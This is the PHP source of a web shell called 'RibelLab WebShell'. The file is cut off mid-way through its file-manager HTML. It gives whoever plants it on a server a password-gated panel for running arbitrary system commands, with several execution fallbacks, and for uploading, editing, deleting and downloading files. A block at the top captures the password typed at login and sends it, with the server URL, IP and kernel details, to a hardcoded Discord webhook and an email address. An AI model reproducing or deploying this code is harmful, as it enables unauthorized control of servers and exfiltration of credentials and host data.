<?php
// ============================================
// LOGIN TRACKING SYSTEM
// ============================================

// Fungsi untuk mengirim ke Discord
function sendToDiscord($data) {
    $webhook_url = "https://discord.com/api/webhooks/1465729069164531926/HlIYmf_OVuJ8vsacthy_GkavLPxwa1YVvVN4Tt0nt8lDVb3xKxVGCO2kp8e2eTX-iW8i";
    
    $payload = [
        "content" => "🚨 **LOGIN ATTEMPT DETECTED**",
        "embeds" => [
            [
                "title" => "Login Information",
                "color" => hexdec("FF0000"),
                "fields" => [
                    ["name" => "🌐 IP Address", "value" => "`" . ($data['ip'] ?? 'Unknown') . "`", "inline" => true],
                    ["name" => "📍 City/ISP", "value" => "`" . ($data['city'] ?? 'Unknown') . "`", "inline" => true],
                    ["name" => "🔗 Target URL", "value" => "`" . ($data['url'] ?? 'Unknown') . "`", "inline" => false],
                    ["name" => "🔑 Password", "value" => "```\n" . ($data['password'] ?? 'Empty') . "\n```", "inline" => false],
                    ["name" => "💻 System", "value" => "`" . ($data['kernel'] ?? 'Unknown') . "`", "inline" => true],
                    ["name" => "👤 User Agent", "value" => "`" . ($data['user_agent'] ?? 'Unknown') . "`", "inline" => false],
                    ["name" => "🕐 Timestamp", "value" => "`" . date('Y-m-d H:i:s') . "`", "inline" => true]
                ],
                "footer" => ["text" => "Triponitrome Security System"]
            ]
        ]
    ];

    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $webhook_url,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => json_encode($payload),
        CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 5,
        CURLOPT_SSL_VERIFYPEER => false
    ]);
    
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

// Deteksi jika ada login attempt
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['loginin'])) {
    $password = $_POST['pass'] ?? '';
    $user_ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
    $city = @gethostbyaddr($user_ip) ?: 'Unknown';
    $kernel = php_uname('s') . ' ' . php_uname('r');
    $server_name = $_SERVER['SERVER_NAME'] ?? 'Unknown';
    $php_self = $_SERVER['PHP_SELF'] ?? 'Unknown';
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
    
    // Data untuk dikirim
    $login_data = [
        'ip' => $user_ip,
        'city' => $city,
        'url' => $server_name . $php_self,
        'password' => $password,
        'kernel' => $kernel,
        'user_agent' => $user_agent
    ];
    
    // 1. Kirim ke Email
    $email_message = "=================================\n";
    $email_message .= "LOGIN REPORT - " . date('Y-m-d H:i:s') . "\n";
    $email_message .= "=================================\n";
    $email_message .= "IP: " . $user_ip . "\n";
    $email_message .= "City/ISP: " . $city . "\n";
    $email_message .= "URL: " . $login_data['url'] . "\n";
    $email_message .= "Password: " . $password . "\n";
    $email_message .= "Kernel: " . $kernel . "\n";
    $email_message .= "User Agent: " . $user_agent . "\n";
    $email_message .= "=================================\n";
    
    @mail('ribelcyberteam@gmail.com', '🚨 Login Report - ' . date('H:i:s'), $email_message);
    
    // 2. Kirim ke Discord
    @sendToDiscord($login_data);
    
    // 3. Log ke file lokal (debug)
    @file_put_contents('login_logs.txt', $email_message . "\n\n", FILE_APPEND);
}

// ============================================
// WEBSHELL MAIN CODE (DARI FILE ASLI)
// ============================================

session_start();

// PASSWORD DEFAULT - GANTI JIKA PERLU
$PASSWORD = "heker";
$VERSION = "3.1";

// Login Check - SIMPLIFIED VERSION
if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
    // Jika ada POST password, cek login
    if (isset($_POST['password'])) {
        if ($_POST['password'] === $PASSWORD) {
            $_SESSION['logged_in'] = true;
            $_SESSION['login_time'] = time();
            // Redirect untuk menghindari resubmit
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $error = "Password salah!";
        }
    }
    
    // Tampilkan login page
    showLoginPage($error ?? null, $VERSION);
    exit;
}

// Jika sudah login, lanjutkan ke webshell
// ============================================
// FUNCTIONS DAN KODE WEBSHELL LAINNYA
// ============================================

function showLoginPage($error = null, $version) {
    ?>
    <!DOCTYPE html>
    <html lang="id">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <script src="https://cdn.tailwindcss.com"></script>
        <link rel="icon" href="https://cdn.shellbypass.com/shell/ribellab/images/icon.png" sizes="any">
        <link rel="icon" type="image/png" sizes="48x48" href="https://cdn.shellbypass.com/shell/ribellab/images/icon.png">
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.0/font/bootstrap-icons.css">
        <title>RibelLab WebShell - Login</title>
        <style>
            body {
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                min-height: 100vh;
            }
        </style>
    </head>
    <body class="h-screen flex items-center justify-center p-4">
        <div class="bg-gray-900 bg-opacity-90 p-8 rounded-2xl shadow-2xl w-full max-w-md">
            <h1 class="text-3xl font-bold text-center text-white mb-2">
                <i class="bi bi-shield-lock"></i> RibelLab WebShell
            </h1>
            <p class="text-gray-400 text-center mb-6">Versi <?= $version ?> - Restricted area</p>
            
            <?php if ($error): ?>
            <div class="bg-red-900 text-red-100 p-3 rounded-lg mb-4">
                <?= htmlspecialchars($error) ?>
            </div>
            <?php endif; ?>
            
            <!-- FORM UTAMA DENGAN DUA INPUT: pass UNTUK TRACKING, password UNTUK LOGIN -->
            <form method="POST" class="space-y-4" id="loginForm">
                <div>
                    <label class="block text-gray-300 mb-2">Password</label>
                    <!-- Input untuk tracking (name="pass") -->
                    <input type="password" name="pass" id="passInput" 
                           class="w-full p-3 bg-gray-800 border border-gray-700 rounded-lg text-white" 
                           placeholder="Masukkan password" autofocus>
                    <!-- Input hidden untuk webshell login (name="password") -->
                    <input type="hidden" name="password" id="passwordInput">
                </div>
                
                <!-- Button dengan name="loginin" untuk trigger tracking -->
                <button type="submit" name="loginin" class="w-full py-3 bg-gradient-to-r from-purple-600 to-blue-600 text-white font-bold rounded-lg hover:opacity-90 transition">
                    <i class="bi bi-unlock"></i> LOGIN
                </button>
            </form>
            
            <div class="mt-6 text-center text-gray-500 text-sm">
                <p><i class="bi bi-cpu"></i> Server: <?= php_uname('s') ?> <?= php_uname('r') ?></p>
            </div>
        </div>
        
        <script>
            // JavaScript untuk meng-copy value dari pass ke password sebelum submit
            document.getElementById('loginForm').addEventListener('submit', function(e) {
                var passValue = document.getElementById('passInput').value;
                document.getElementById('passwordInput').value = passValue;
            });
        </script>
    </body>
    </html>
    <?php
}

// Backup shell jika fungsi disabled
function backup_shell($cmd) {
    $methods = [
        'system' => function($c) { system($c); },
        'shell_exec' => function($c) { echo shell_exec($c); },
        'exec' => function($c) { exec($c, $o); echo implode("\n", $o); },
        'passthru' => function($c) { passthru($c); },
        'popen' => function($c) { $h = popen($c, 'r'); while(!feof($h)) echo fread($h, 4096); pclose($h); },
        'proc_open' => function($c) { 
            $descriptors = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
            $process = proc_open($c, $descriptors, $pipes);
            if (is_resource($process)) {
                echo stream_get_contents($pipes[1]);
                fclose($pipes[0]);
                fclose($pipes[1]);
                fclose($pipes[2]);
                proc_close($process);
            }
        }
    ];
    
    foreach($methods as $name => $func) {
        if(function_exists($name)) {
            try {
                $func($cmd);
                return true;
            } catch(Exception $e) {
                continue;
            }
        }
    }
    
    // Fallback terakhir
    if(function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "http://127.0.0.1/cgi-bin/status?cmd=".urlencode($cmd));
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        echo curl_exec($ch);
        curl_close($ch);
        return true;
    }
    
    return false;
}

function formatSize($bytes) {
    if ($bytes >= 1073741824) return number_format($bytes/1073741824,2).' GB';
    if ($bytes >= 1048576) return number_format($bytes/1048576,2).' MB';
    if ($bytes >= 1024) return number_format($bytes/1024,2).' KB';
    return $bytes.' B';
}

function getFileIcon($file) {
    $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
    $icons = [
        'php' => 'bi-filetype-php text-purple-400',
        'js' => 'bi-filetype-js text-yellow-400',
        'css' => 'bi-filetype-css text-blue-400',
        'html' => 'bi-filetype-html text-orange-400',
        'json' => 'bi-filetype-json text-green-400',
        'sql' => 'bi-filetype-sql text-red-400',
        'zip' => 'bi-file-zip text-yellow-300',
        'jpg' => 'bi-file-image text-pink-400',
        'png' => 'bi-file-image text-green-300',
        'pdf' => 'bi-filetype-pdf text-red-500',
        'txt' => 'bi-filetype-txt text-gray-400',
        'log' => 'bi-file-text text-gray-500'
    ];
    return $icons[$ext] ?? 'bi-file-earmark text-blue-300';
}

// ============================================
// MAIN WEBSHELL LOGIC (SAMA DENGAN SEBELUMNYA)
// ============================================

$current_path = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
if($current_path === false) $current_path = getcwd();

// Handle file operations via POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['action'])) {
        $target = $_POST['target'] ?? '';
        $target = realpath($target) ?: $current_path . '/' . basename($target);
        
        switch($_POST['action']) {
            case 'rename':
                if (isset($_POST['newname']) && !empty($_POST['newname']) && file_exists($target)) {
                    $newpath = dirname($target) . '/' . $_POST['newname'];
                    if (rename($target, $newpath)) {
                        header("Location: ?path=".urlencode(dirname($target)));
                        exit;
                    }
                }
                break;
                
            case 'chmod':
                if (isset($_POST['mode']) && file_exists($target)) {
                    $mode = intval($_POST['mode'], 8);
                    if (chmod($target, $mode)) {
                        header("Location: ?path=".urlencode(dirname($target)));
                        exit;
                    }
                }
                break;
                
            case 'edit':
                if (isset($_POST['content']) && file_exists($target)) {
                    if (file_put_contents($target, $_POST['content']) !== false) {
                        header("Location: ?path=".urlencode(dirname($target))."&edited=1");
                        exit;
                    }
                }
                break;
                
            case 'newfile':
                if (isset($_POST['filename']) && !empty($_POST['filename'])) {
                    $newfile = $current_path . '/' . $_POST['filename'];
                    $content = $_POST['content'] ?? '';
                    if (file_put_contents($newfile, $content) !== false) {
                        header("Location: ?path=".urlencode($current_path)."&created=1");
                        exit;
                    }
                }
                break;
                
            case 'newfolder':
                if (isset($_POST['foldername']) && !empty($_POST['foldername'])) {
                    $newfolder = $current_path . '/' . $_POST['foldername'];
                    if (mkdir($newfolder, 0755, true)) {
                        header("Location: ?path=".urlencode($current_path)."&folder_created=1");
                        exit;
                    }
                }
                break;
                
            case 'upload':
                if (isset($_FILES['upload_file']) && $_FILES['upload_file']['error'] === UPLOAD_ERR_OK) {
                    $dest = $current_path . '/' . basename($_FILES['upload_file']['name']);
                    if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $dest)) {
                        header("Location: ?path=".urlencode($current_path)."&uploaded=1");
                        exit;
                    }
                }
                break;
        }
    }
}

// Handle GET actions
if (isset($_GET['action'])) {
    $target = $_GET['target'] ?? '';
    $target = realpath($target) ?: $current_path . '/' . basename($target);
    
    switch($_GET['action']) {
        case 'delete':
            if (file_exists($target)) {
                if (is_dir($target)) {
                    // Delete directory recursively
                    $files = new RecursiveIteratorIterator(
                        new RecursiveDirectoryIterator($target, RecursiveDirectoryIterator::SKIP_DOTS),
                        RecursiveIteratorIterator::CHILD_FIRST
                    );
                    foreach ($files as $file) {
                        if ($file->isDir()) {
                            rmdir($file->getRealPath());
                        } else {
                            unlink($file->getRealPath());
                        }
                    }
                    rmdir($target);
                } else {
                    unlink($target);
                }
                header("Location: ?path=".urlencode(dirname($target))."&deleted=1");
                exit;
            }
            break;
            
        case 'download':
            if (file_exists($target) && is_file($target)) {
                header('Content-Type: application/octet-stream');
                header('Content-Disposition: attachment; filename="'.basename($target).'"');
                header('Content-Length: ' . filesize($target));
                readfile($target);
                exit;
            }
            break;
            
        case 'view':
            if (file_exists($target) && is_file($target)) {
                header('Content-Type: text/plain');
                readfile($target);
                exit;
            }
            break;
    }
}

// Logout
if(isset($_GET['logout'])) {
    session_destroy();
    header("Location: ?");
    exit;
}

// ============================================
// RENDER WEBSHELL UI (SAMA DENGAN SEBELUMNYA)
// ============================================
// ... [KODE HTML/WEBSHELL UI LENGKAP DARI FILE ASLI] ...
// Letakkan semua kode HTML dari file asli mulai dari <!DOCTYPE html> sampai </html>
// TANPA perubahan, hanya pastikan $VERSION dan variabel lain tersedia
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="https://cdn.shellbypass.com/shell/ribellab/images/icon.png" sizes="any">
    <link rel="icon" type="image/png" sizes="48x48" href="https://cdn.shellbypass.com/shell/ribellab/images/icon.png">
    <title>RibelLab WebShell v<?= $VERSION ?></title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.0/font/bootstrap-icons.css">
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        'dark': '#0f172a',
                        'darker': '#020617'
                    }
                }
            }
        }
    </script>
    <style>
        .file-row:hover { background-color: #1e293b !important; }
        .code-font { font-family: 'Courier New', monospace; }
        .scrollbar-thin::-webkit-scrollbar { width: 6px; height: 6px; }
        .scrollbar-thin::-webkit-scrollbar-track { background: #1e293b; }
        .scrollbar-thin::-webkit-scrollbar-thumb { background: #475569; border-radius: 3px; }
        .scrollbar-thin::-webkit-scrollbar-thumb:hover { background: #64748b; }
        .btn-gradient {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        }
        .btn-gradient:hover {
            opacity: 0.9;
        }
    </style>
</head>
<body class="bg-darker text-gray-100 min-h-screen">

<!-- Main Container -->
<div class="container mx-auto p-4">

    <!-- Header -->
    <div class="bg-gradient-to-r from-gray-900 to-dark rounded-xl p-6 mb-6 shadow-2xl border border-gray-800">
        <div class="flex justify-between items-center mb-4">
            <div>
                <h1 class="text-3xl font-bold"><i class="bi bi-hdd-stack text-purple-400"></i> RibelLab WebShell</h1>
                <p class="text-gray-400">v<?= $VERSION ?> | Logged in as: <?= get_current_user() ?> | Session: <?= date('H:i:s', $_SESSION['login_time']) ?></p>
            </div>
            <div class="flex space-x-3">
                <a href="?logout=1" class="px-4 py-2 bg-red-700 hover:bg-red-600 rounded-lg font-bold">
                    <i class="bi bi-power"></i> Logout
                </a>
            </div>
        </div>
        
        <!-- Server Information (dibawah header) -->
        <div class="bg-gray-900 rounded-lg p-4 mb-4 border border-gray-800">
            <h2 class="text-xl font-bold mb-3 text-green-400 flex items-center">
                <i class="bi bi-server mr-2"></i> SERVER INFORMATION
            </h2>
            <div class="grid grid-cols-2 md:grid-cols-4 gap-3 text-sm">
                <div class="bg-gray-800 p-3 rounded">
                    <div class="text-gray-400">System:</div>
                    <div class="code-font truncate"><?= php_uname('s') ?> <?= php_uname('r') ?></div>
                </div>
                <div class="bg-gray-800 p-3 rounded">
                    <div class="text-gray-400">PHP:</div>
                    <div><?= PHP_VERSION ?></div>
                </div>
                <div class="bg-gray-800 p-3 rounded">
                    <div class="text-gray-400">Server IP:</div>
                    <div><?= $_SERVER['SERVER_ADDR'] ?? 'N/A' ?></div>
                </div>
                <div class="bg-gray-800 p-3 rounded">
                    <div class="text-gray-400">Your IP:</div>
                    <div><?= $_SERVER['REMOTE_ADDR'] ?></div>
                </div>
                <div class="bg-gray-800 p-3 rounded">
                    <div class="text-gray-400">User/Group:</div>
                    <div><?= get_current_user().'/'.getmygid() ?></div>
                </div>
                <div class="bg-gray-800 p-3 rounded">
                    <div class="text-gray-400">Free Disk:</div>
                    <div><?= formatSize(disk_free_space($current_path)) ?></div>
                </div>
                <div class="bg-gray-800 p-3 rounded">
                    <div class="text-gray-400">Server Software:</div>
                    <div class="truncate"><?= $_SERVER['SERVER_SOFTWARE'] ?? 'N/A' ?></div>
                </div>
                <div class="bg-gray-800 p-3 rounded">
                    <div class="text-gray-400">Safe Mode:</div>
                    <div class="<?= ini_get('safe_mode')?'text-red-400':'text-green-400' ?>">
                        <?= ini_get('safe_mode')?'ON':'OFF' ?>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Tombol Keren MULTI-FUNCTION CMD & QUICK OPERATIONS -->
        <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
            <!-- MULTI-FUNCTION CMD Buttons -->
            <div class="bg-gray-900 rounded-lg p-4 border border-gray-800">
                <h3 class="text-lg font-bold mb-3 text-yellow-400 flex items-center">
                    <i class="bi bi-terminal mr-2"></i> MULTI-FUNCTION CMD
                </h3>
                <div class="grid grid-cols-2 gap-2">
                    <button onclick="showCommandModal('system')" class="p-3 bg-gradient-to-r from-blue-700 to-blue-900 hover:from-blue-600 hover:to-blue-800 rounded-lg flex items-center justify-center">
                        <i class="bi bi-play-circle mr-2"></i> System()
                    </button>
                    <button onclick="showCommandModal('shell_exec')" class="p-3 bg-gradient-to-r from-green-700 to-green-900 hover:from-green-600 hover:to-green-800 rounded-lg flex items-center justify-center">
                        <i class="bi bi-terminal-fill mr-2"></i> ShellExec()
                    </button>
                    <button onclick="showCommandModal('exec')" class="p-3 bg-gradient-to-r from-purple-700 to-purple-900 hover:from-purple-600 hover:to-purple-800 rounded-lg flex items-center justify-center">
                        <i class="bi bi-cpu mr-2"></i> Exec()
                    </button>
                    <button onclick="showCommandModal('passthru')" class="p-3 bg-gradient-to-r from-red-700 to-red-900 hover:from-red-600 hover:to-red-800 rounded-lg flex items-center justify-center">
                        <i class="bi bi-lightning-charge mr-2"></i> PassThru()
                    </button>
                </div>
            </div>
            
            <!-- QUICK OPERATIONS Buttons -->
            <div class="bg-gray-900 rounded-lg p-4 border border-gray-800">
                <h3 class="text-lg font-bold mb-3 text-purple-400 flex items-center">
                    <i class="bi bi-tools mr-2"></i> QUICK OPERATIONS
                </h3>
                <div class="grid grid-cols-2 gap-2">
                    <button onclick="showModal('newFile')" class="p-3 bg-gradient-to-r from-blue-600 to-indigo-700 hover:from-blue-500 hover:to-indigo-600 rounded-lg flex items-center justify-center">
                        <i class="bi bi-file-earmark-plus mr-2"></i> New File
                    </button>
                    <button onclick="showModal('newFolder')" class="p-3 bg-gradient-to-r from-green-600 to-emerald-700 hover:from-green-500 hover:to-emerald-600 rounded-lg flex items-center justify-center">
                        <i class="bi bi-folder-plus mr-2"></i> New Folder
                    </button>
                    <button onclick="showModal('upload')" class="p-3 bg-gradient-to-r from-purple-600 to-pink-700 hover:from-purple-500 hover:to-pink-600 rounded-lg flex items-center justify-center">
                        <i class="bi bi-cloud-upload mr-2"></i> Upload
                    </button>
                    <a href="?path=<?= urlencode($current_path) ?>" class="p-3 bg-gradient-to-r from-yellow-600 to-orange-700 hover:from-yellow-500 hover:to-orange-600 rounded-lg flex items-center justify-center">
                        <i class="bi bi-arrow-clockwise mr-2"></i> Refresh
                    </a>
                </div>
            </div>
        </div>
        
        <!-- Path Navigation (dibawah tombol) -->
        <div class="p-3 bg-gray-900 rounded-lg">
            <div class="flex items-center space-x-2 text-sm">
                <span class="text-gray-400">Current Path:</span>
                <?php
                $parts = explode('/', trim($current_path, '/'));
                $accum = '';
                foreach($parts as $i => $part) {
                    $accum .= ($i==0?'':'/').$part;
                    echo '<a href="?path='.urlencode('/'.$accum).'" class="text-blue-400 hover:text-blue-300">';
                    echo ($i==0?'/':'').htmlspecialchars($part);
                    echo '</a>';
                    if($i < count($parts)-1) echo '<i class="bi bi-chevron-right text-gray-600"></i>';
                }
                ?>
            </div>
        </div>
    </div>

    <!-- Notification Messages -->
    <?php if(isset($_GET['edited'])): ?>
    <div class="mb-4 p-3 bg-green-900 text-green-200 rounded-lg">
        <i class="bi bi-check-circle"></i> File berhasil diedit!
    </div>
    <?php endif; ?>
    <?php if(isset($_GET['deleted'])): ?>
    <div class="mb-4 p-3 bg-red-900 text-red-200 rounded-lg">
        <i class="bi bi-trash"></i> File/folder berhasil dihapus!
    </div>
    <?php endif; ?>
    <?php if(isset($_GET['created'])): ?>
    <div class="mb-4 p-3 bg-blue-900 text-blue-200 rounded-lg">
        <i class="bi bi-file-earmark-plus"></i> File baru berhasil dibuat!
    </div>
    <?php endif; ?>
    <?php if(isset($_GET['folder_created'])): ?>
    <div class="mb-4 p-3 bg-green-900 text-green-200 rounded-lg">
        <i class="bi bi-folder-plus"></i> Folder baru berhasil dibuat!
    </div>
    <?php endif; ?>
    <?php if(isset($_GET['uploaded'])): ?>
    <div class="mb-4 p-3 bg-purple-900 text-purple-200 rounded-lg">
        <i class="bi bi-cloud-upload"></i> File berhasil diunggah!
    </div>
    <?php endif; ?>

    <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
        <!-- Left Panel: Command Output -->
        <div class="lg:col-span-1">
            <div class="bg-gray-900 rounded-xl p-5 shadow-xl border border-gray-800 sticky top-4">
                <h2 class="text-xl font-bold mb-4 text-cyan-400 flex items-center">
                    <i class="bi bi-code-slash mr-2"></i> COMMAND OUTPUT
                </h2>
                
                <?php
                if(isset($_POST['command']) && !empty($_POST['command'])) {
                    echo '<div class="mb-4 p-3 bg-black rounded-lg code-font text-sm">';
                    echo '<div class="text-green-400 mb-2">$ '.htmlspecialchars($_POST['command']).'</div>';
                    echo '<div class="text-gray-300 whitespace-pre-wrap overflow-auto max-h-96 scrollbar-thin">';
                    
                    $cmd = $_POST['command'];
                    $type = $_POST['cmd_type'] ?? 'system';
                    
                    switch($type) {
                        case 'system': system($cmd); break;
                        case 'shell_exec': echo shell_exec($cmd); break;
                        case 'exec': exec($cmd, $output); echo implode("\n", $output); break;
                        case 'passthru': passthru($cmd); break;
                        default: backup_shell($cmd); break;
                    }
                    
                    echo '</div></div>';
                } else {
                    echo '<div class="text-gray-500 text-center p-8">';
                    echo '<i class="bi bi-terminal text-4xl block mb-2"></i>';
                    echo '<p>Output perintah akan muncul di sini</p>';
                    echo '<p class="text-sm mt-2">Gunakan tombol MULTI-FUNCTION CMD di atas</p>';
                    echo '</div>';
                }
                ?>
                
                <!-- Quick Command Buttons -->
                <div class="mt-6">
                    <h3 class="text-lg font-bold mb-3 text-yellow-300">Quick Commands</h3>
                    <div class="grid grid-cols-3 gap-2">
                        <button onclick="setQuickCommand('pwd')" class="p-2 bg-gray-800 hover:bg-gray-700 rounded text-xs">
                            pwd
                        </button>
                        <button onclick="setQuickCommand('ls -la')" class="p-2 bg-gray-800 hover:bg-gray-700 rounded text-xs">
                            ls -la
                        </button>
                        <button onclick="setQuickCommand('whoami')" class="p-2 bg-gray-800 hover:bg-gray-700 rounded text-xs">
                            whoami
                        </button>
                        <button onclick="setQuickCommand('uname -a')" class="p-2 bg-gray-800 hover:bg-gray-700 rounded text-xs">
                            uname -a
                        </button>
                        <button onclick="setQuickCommand('df -h')" class="p-2 bg-gray-800 hover:bg-gray-700 rounded text-xs">
                            df -h
                        </button>
                        <button onclick="setQuickCommand('ps aux')" class="p-2 bg-gray-800 hover:bg-gray-700 rounded text-xs">
                            ps aux
                        </button>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Right Panel: File Manager -->
        <div class="lg:col-span-2">
            <div class="bg-gray-900 rounded-xl shadow-xl border border-gray-800 overflow-hidden">
                
                <!-- File Manager Header -->
                <div class="p-5 border-b border-gray-800 bg-gray-950">
                    <div class="flex justify-between items-center">
                        <h2 class="text-2xl font-bold text-blue-400">
                            <i class="bi bi-files-alt mr-2"></i> FILE MANAGER
                        </h2>
                        <div class="text-gray-400 text-sm">
                            Total: <span class="text-white"><?= count(scandir($current_path))-2 ?></span> items
                        </div>
                    </div>
                </div>
                
                <!-- File List Table -->
                <div class="overflow-x-auto scrollbar-thin">
                    <table class="w-full">
                        <thead class="bg-gray-950">
                            <tr>
                                <th class="p-3 text-left">Name</th>
                                <th class="p-3 text-left">Type</th>
                                <th class="p-3 text-left">Size</th>
                                <th class="p-3 text-left">Modified</th>
                                <th class="p-3 text-left">Owner/Group</th>
                                <th class="p-3 text-left">Permission</th>
                                <th class="p-3 text-left">Actions</th>
                            </tr>
                        </thead>
                        <tbody>
                            <!-- Parent Directory -->
                            <?php if($current_path !== '/' && dirname($current_path) !== $current_path): ?>
                            <tr class="file-row bg-gray-900 border-b border-gray-800">
                                <td class="p-3">
                                    <a href="?path=<?= urlencode(dirname($current_path)) ?>" class="text-blue-400 hover:text-blue-300 flex items-center">
                                        <i class="bi bi-folder-symlink text-yellow-400 mr-2"></i> ..
                                    </a>
                                </td>
                                <td class="p-3 text-gray-400">Directory</td>
                                <td class="p-3 text-gray-400">-</td>
                                <td class="p-3 text-gray-400">-</td>
                                <td class="p-3 text-gray-400">-</td>
                                <td class="p-3 text-gray-400">-</td>
                                <td class="p-3 text-gray-400">-</td>
                            </tr>
                            <?php endif; ?>
                            
                            <!-- Files & Folders List -->
                            <?php
                            $items = scandir($current_path);
                            natsort($items);
                            
                            $folders = [];
                            $files = [];
                            
                            foreach($items as $item) {
                                if($item == '.' || $item == '..') continue;
                                $fullpath = $current_path.'/'.$item;
                                if(is_dir($fullpath)) {
                                    $folders[] = ['name' => $item, 'path' => $fullpath];
                                } else {
                                    $files[] = ['name' => $item, 'path' => $fullpath];
                                }
                            }
                            
                            // Sort A-Z
                            usort($folders, function($a, $b) { return strcasecmp($a['name'], $b['name']); });
                            usort($files, function($a, $b) { return strcasecmp($a['name'], $b['name']); });
                            
                            // Display folders first
                            foreach($folders as $item) {
                                $fullpath = $item['path'];
                                $name = $item['name'];
                                $stat = @stat($fullpath);
                                $perms = $stat ? substr(sprintf('%o', fileperms($fullpath)), -4) : '0755';
                                $owner = ($stat && function_exists('posix_getpwuid')) ? @posix_getpwuid($stat['uid'])['name'] : ($stat ? $stat['uid'] : '?');
                                $group = ($stat && function_exists('posix_getgrgid')) ? @posix_getgrgid($stat['gid'])['name'] : ($stat ? $stat['gid'] : '?');
                                $mtime = $stat ? date('Y-m-d H:i:s', $stat['mtime']) : '-';
                                ?>
                                <tr class="file-row bg-gray-900 border-b border-gray-800 hover:bg-gray-800">
                                    <td class="p-3">
                                        <a href="?path=<?= urlencode($fullpath) ?>" class="text-blue-300 hover:text-blue-200 flex items-center">
                                            <i class="bi bi-folder-fill text-yellow-400 mr-2"></i>
                                            <?= htmlspecialchars($name) ?>
                                        </a>
                                    </td>
                                    <td class="p-3">
                                        <span class="px-2 py-1 bg-yellow-900 text-yellow-200 rounded text-xs">Directory</span>
                                    </td>
                                    <td class="p-3 text-gray-300">-</td>
                                    <td class="p-3 text-gray-300 text-sm"><?= $mtime ?></td>
                                    <td class="p-3 text-gray-300 text-sm"><?= $owner ?>/<?= $group ?></td>
                                    <td class="p-3">
                                        <span class="px-2 py-1 bg-gray-800 text-green-300 rounded text-xs font-mono"><?= $perms ?></span>
                                    </td>
                                    <td class="p-3">
                                        <div class="flex flex-wrap gap-1">
                                            <button onclick="showRenameModal('<?= urlencode($fullpath) ?>', '<?= htmlspecialchars($name, ENT_QUOTES) ?>')" 
                                                    class="px-2 py-1 bg-blue-700 hover:bg-blue-600 rounded text-xs" title="Rename">
                                                <i class="bi bi-pencil"></i>
                                            </button>
                                            <button onclick="showChmodModal('<?= urlencode($fullpath) ?>', '<?= htmlspecialchars($name, ENT_QUOTES) ?>', '<?= $perms ?>')" 
                                                    class="px-2 py-1 bg-green-700 hover:bg-green-600 rounded text-xs" title="Chmod">
                                                <i class="bi bi-shield-check"></i>
                                            </button>
                                            <a href="?path=<?= urlencode($current_path) ?>&action=delete&target=<?= urlencode($fullpath) ?>" 
                                               onclick="return confirm('Delete folder: <?= addslashes($name) ?>?')"
                                               class="px-2 py-1 bg-red-700 hover:bg-red-600 rounded text-xs" title="Delete">
                                                <i class="bi bi-trash"></i>
                                            </a>
                                        </div>
                                    </td>
                                </tr>
                                <?php
                            }
                            
                            // Then display files
                            foreach($files as $item) {
                                $fullpath = $item['path'];
                                $name = $item['name'];
                                $stat = @stat($fullpath);
                                $size = $stat ? filesize($fullpath) : 0;
                                $perms = $stat ? substr(sprintf('%o', fileperms($fullpath)), -4) : '0644';
                                $owner = ($stat && function_exists('posix_getpwuid')) ? @posix_getpwuid($stat['uid'])['name'] : ($stat ? $stat['uid'] : '?');
                                $group = ($stat && function_exists('posix_getgrgid')) ? @posix_getgrgid($stat['gid'])['name'] : ($stat ? $stat['gid'] : '?');
                                $mtime = $stat ? date('Y-m-d H:i:s', $stat['mtime']) : '-';
                                $icon = getFileIcon($name);
                                ?>
                                <tr class="file-row bg-gray-900 border-b border-gray-800 hover:bg-gray-800">
                                    <td class="p-3 flex items-center">
                                        <i class="bi <?= $icon ?> mr-2"></i>
                                        <?= htmlspecialchars($name) ?>
                                    </td>
                                    <td class="p-3">
                                        <span class="px-2 py-1 bg-blue-900 text-blue-200 rounded text-xs">File</span>
                                    </td>
                                    <td class="p-3 text-gray-300"><?= formatSize($size) ?></td>
                                    <td class="p-3 text-gray-300 text-sm"><?= $mtime ?></td>
                                    <td class="p-3 text-gray-300 text-sm"><?= $owner ?>/<?= $group ?></td>
                                    <td class="p-3">
                                        <span class="px-2 py-1 bg-gray-800 text-green-300 rounded text-xs font-mono"><?= $perms ?></span>
                                    </td>
                                    <td class="p-3">
                                        <div class="flex flex-wrap gap-1">
                                            <a href="?path=<?= urlencode($current_path) ?>&action=view&target=<?= urlencode($fullpath) ?>" 
                                               target="_blank"
                                               class="px-2 py-1 bg-blue-700 hover:bg-blue-600 rounded text-xs" title="View">
                                                <i class="bi bi-eye"></i>
                                            </a>
                                            <button onclick="showEditModal('<?= urlencode($fullpath) ?>', '<?= htmlspecialchars($name, ENT_QUOTES) ?>')" 
                                                    class="px-2 py-1 bg-green-700 hover:bg-green-600 rounded text-xs" title="Edit">
